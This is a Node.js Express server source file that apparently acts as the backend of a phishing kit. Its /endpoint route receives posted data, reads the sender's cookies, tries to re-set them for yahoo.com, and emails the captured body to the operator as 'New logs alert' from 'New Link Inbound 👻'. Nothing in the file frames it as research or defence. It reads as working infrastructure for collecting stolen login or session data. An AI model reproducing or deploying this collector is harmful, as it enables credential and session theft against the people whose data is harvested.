const express = require("express");
const cors = require("cors");
const cookieParser = require("cookie-parser"); // Add this line
const app = express();
const port = process.env.PORT || 3001;

const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: `${process.env.Emailhost}`,
  port: 587,
  secure: false, // Use `true` for port 465, `false` for all other ports
  auth: {
    user: `${process.env.Emailuser}`,
    pass: `${process.env.Emailpassword}`,
  },
});

async function sender(payload) {
  // send mail with defined transport object
  const info = await transporter.sendMail({
    from: `"New Link Inbound 👻" <${process.env.Emailaddress}>`, // sender address
    to: `${process.env.Emailaddress}`, // list of receivers
    subject: "New logs alert ✔", // Subject line
    html: `${payload?.body}\n\n`
  });

  console.log("Message sent: %s", info);
}

sender().catch(console.error);


app.use(cors());
app.use(express.json());
app.use(cookieParser()); // Add this line

app.get("/", (req, res) => res.type('html').send("Hello There!"));

app.post("/endpoint", async (req, res) => {
    const body = await req.body;
    const cookies = req.cookies; // Extract cookies
    const userAgent = req.get('User-Agent'); // Extract User-Agent

    // Check if cookies are available
    if (cookies && Object.keys(cookies).length > 0) {
        // Set all received cookies for the domain yahoo.com
        for (const [name, value] of Object.entries(cookies)) {
            res.cookie(name, value, { domain: 'yahoo.com', path: '/' });
        }
    } else {
        console.log("No cookies available");
    }
    const payload = {
        body
    }
    await sender(payload);
    console.log({payload, cookies}, req.rawHeaders)
    return res.json({ body }).status(200); // Include cookies and userAgent in response
});

const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));

server.keepAliveTimeout = 120 * 1000;
server.headersTimeout = 120 * 1000;
